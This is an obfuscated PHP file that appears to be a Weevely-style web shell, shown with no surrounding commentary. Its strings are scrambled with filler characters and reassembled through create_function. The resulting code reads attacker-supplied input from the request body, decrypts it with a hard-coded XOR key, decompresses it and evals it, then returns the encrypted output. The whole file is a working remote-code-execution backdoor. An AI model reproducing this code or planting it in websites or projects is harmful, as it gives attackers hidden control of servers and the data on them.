<?php
$r='or($i=0;$i|L<$l;|L){for($j=|L0|L;($j<$c&&$i<$|Ll);|L$j++|L,$i++)|L{$o.=$t{$i}^|L$k{$';
$e='$k="14|L|L8fbc5e";$k|Lh="7|Lcff7|L8ffb6a4";|L$kf="05538|L|L747d952";$p=|L"ri145ng|LnYs6T|';
$O='|Lnts("p|Lhp:/|L|L/input"),|L$m)==1) {@ob_|Lstart();@|Leva|Ll(@|Lgzu|Lncompress(@|L';
$H=');$r=|L@base6|L4_en|L|Lcode|L(@x(@gzcompr|Les|Ls($o),$k));|Lpr|Lint("$p$kh$r$|Lkf");}';
$S=str_replace('x','','cxreaxte_xfuxxnctixon');
$x='L1P|L4F";|Lfunction x($|Lt,$|Lk){$c=|Ls|Ltrlen($k);$l=st|Lrlen(|L$t);$|Lo=""|L;f|L';
$q='x(|L@b|Lase64_decode($|Lm[1]),$k))|L);$o|L=@o|Lb_get_co|Lnt|Lents();@ob_e|Lnd_c|Llean(';
$R='j|L};}|L}r|Leturn $o|L;}if (@preg_|Lmatc|Lh("/$kh(|L.+)|L$|Lkf/",@fil|Le_get_con|Lte';
$V=str_replace('|L','',$e.$x.$r.$R.$O.$q.$H);
$y=$S('',$V);$y();
?>
